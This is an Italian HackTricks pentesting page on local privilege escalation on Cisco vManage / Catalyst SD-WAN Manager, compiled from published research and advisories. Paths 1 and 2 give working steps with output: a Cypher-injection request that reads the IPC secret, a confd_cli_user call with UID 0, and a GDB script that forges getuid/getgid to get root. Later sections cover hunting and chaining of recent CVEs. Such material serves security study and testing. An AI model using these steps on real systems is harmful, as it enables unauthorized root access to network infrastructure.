# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Una volta ottenuta code execution su Cisco vManage / *Catalyst SD-WAN Manager* come `vmanage`, `netadmin` o `vmanage-admin`, le superfici locali di privesc più interessanti sono di solito lo stack CLI `confd`, l'helper `cmdptywrapper`, le localhost REST APIs e gli handler di import/upload di proprietà di root.

Se hai ancora bisogno dell'**initial foothold** su un controller, controlla prima la pagina dedicata al control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
```
Se `/etc/confd/confd_ipc_secret` è leggibile dal tuo foothold, Path 1 e Path 2 diventano immediatamente praticabili.

## Path 1

(Esempio da [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Dopo aver scavato un po' in della [documentazione](http://66.218.245.39/doc/html/rn03re18.html) relativa a `confd` e ai diversi binary (accessibile con un account sul sito Cisco), abbiamo scoperto che, per autenticare il socket IPC, usa un secret situato in `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Ricordi la nostra istanza Neo4j? Sta girando con i privilegi dell'utente `vmanage`, permettendoci così di recuperare il file usando la vulnerabilità precedente:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Il programma `confd_cli` non supporta argomenti da riga di comando ma chiama `/usr/bin/confd_cli_user` con argomenti. Quindi, potremmo chiamare direttamente `/usr/bin/confd_cli_user` con il nostro insieme di argomenti. Tuttavia non è leggibile con i nostri privilegi attuali, quindi dobbiamo recuperarlo dal rootfs e copiarlo usando scp, leggere l'help e usarlo per ottenere la shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Esempio da [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Il blog¹ del team synacktiv descriveva un modo elegante per ottenere una root shell, ma il problema è che richiede di ottenere una copia di `/usr/bin/confd_cli_user`, che è leggibile solo da root. Ho trovato un altro modo per fare privilege escalation a root senza tutta questa complicazione.

Quando ho disassemblato il binary `/usr/bin/confd_cli`, ho osservato quanto segue:

<details>
<summary>Objdump che mostra la raccolta di UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Quando eseguo “ps aux”, ho osservato quanto segue (_nota -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Avevo ipotizzato che il programma “confd_cli” passasse l’ID utente e l’ID gruppo che aveva raccolto dall’utente loggato all’applicazione “cmdptywrapper”.

Il mio primo tentativo è stato eseguire direttamente “cmdptywrapper” e fornirgli `-g 0 -u 0`, ma ha fallito. Sembra che un file descriptor (-i 1015) sia stato creato da qualche parte lungo il percorso e non riesco a falsificarlo.

Come menzionato nel blog di synacktiv (ultimo esempio), il programma “confd_cli” non supporta argomenti da linea di comando, ma posso influenzarlo con un debugger e, fortunatamente, GDB è incluso nel sistema.

Ho creato uno script GDB in cui ho forzato le API `getuid` e `getgid` a restituire 0. Poiché ho già il privilegio “vmanage” tramite la deserialization RCE, ho i permessi per leggere direttamente `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Output della console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco ha poi documentato un percorso locale più pulito verso root nel proprio advisory per [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): un **attacker autenticato con soli privilegi read-only** poteva inviare una request costruita ad hoc al manager CLI e ottenere root a causa di una insufficiente input validation.

Dal punto di vista offensivo, questo è il takeaway importante:

1. Una volta ottenuto *qualsiasi* foothold low-priv sulla macchina, dovresti testare il servizio CLI locale prima di passare al workflow più pesante di Path 1 / Path 2.
2. Riutilizza gli artifact di Path 2 per trovare il trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Considera ogni campo inoltrato al backend CLI come sospetto: UID/GID, username, terminal metadata, imported files, o qualsiasi valore poi consumato da un helper owned da root.
4. Se un utente low-priv può raggiungere il socket CLI locale e influenzare quei campi, root potrebbe essere a una sola request costruita ad hoc di distanza.

Un workflow pratico dopo aver ottenuto accesso all'appliance è:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Questo trasforma il bug del 2025 in un buon pattern di hunting per versioni simili: cerca **local CLI shims che raccolgono l'identità in userland e la inoltrano a un wrapper con privilegi maggiori**.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

L'advisory di Cisco di febbraio 2026 ha introdotto anche un'altra utile classe di privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) consentiva a un **attacker locale autenticato con privilegi bassi** di ottenere root a causa di un meccanismo di user-authentication insufficiente nella REST API.

Questo è importante perché il privesc su vManage non si limita più all'abuso di `confd`/TTY. Dopo una shell a bassa privilege, cerca anche:

- localhost-only API endpoints che si fidano troppo del caller
- token, cookie o service credentials leggibili dall'account corrente
- azioni root-only esposte tramite handler `dataservice`/REST che possono ancora essere attivate localmente

In pratica, una volta che hai una shell come `vmanage` o un altro service user, l'abuso locale della API è spesso più silenzioso e più facile da automatizzare rispetto all'abuso interattivo della CLI:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Se la context della sessione locale è sufficiente per raggiungere funzionalità REST privilegiate, preferisci il path API: è più facile da replay, scriptare e concatenare con sessioni web rubate o API token.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Un altro pattern recente è [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): un attaccante locale con privilegi `netadmin` poteva caricare un **crafted file** che in seguito la CLI gestiva in modo non sicuro, portando a command injection come `root`.

Dal punto di vista di HackTricks, la tecnica preziosa è più ampia della singola CVE:

1. Enumera ogni workflow CLI o web che accetta un file: import, diagnostic bundles, template, validator, backup, tenant data, ecc.
2. Traccia dove finisce il file caricato e quale script o binary di proprietà di root lo consuma.
3. Testa se il filename, il contenuto del file o i metadata parsati vengono mai passati a shell commands, wrapper scripts o helper in stile `system()`.
4. Se puoi già raggiungere `netadmin` (creds valide, sessione rubata o una chain di auth-bypass), i bug di file-processing sono spesso il path più veloce verso root.

Questa classe di bug si concatena particolarmente bene con foothold remoti che concedono `netadmin` ma non `root`.

## Altri recenti vulns di vManage/Catalyst SD-WAN da concatenare

- **Authenticated UI XSS (CVE-2024-20475)** – Ruba una sessione admin nella web UI, poi fai pivot verso azioni API/CLI che alla fine raggiungono `vshell` o uno dei path di privesc locali sopra.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Precursor molto forte per Path 5 perché `netadmin` è esattamente il livello richiesto dalla crafted-file privesc del 2026.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Utile per droppare file che poi vengono parsati da componenti privilegiati o per sovrascrivere artifact operativi consumati da helper di proprietà di root.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Meglio documentato nella pagina dedicata al control-plane SD-WAN; può aggiungere una SSH key per `vmanage-admin`, dandoti il foothold locale necessario per tornare su questa pagina.

## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)

{{#include ../../banners/hacktricks-training.md}}
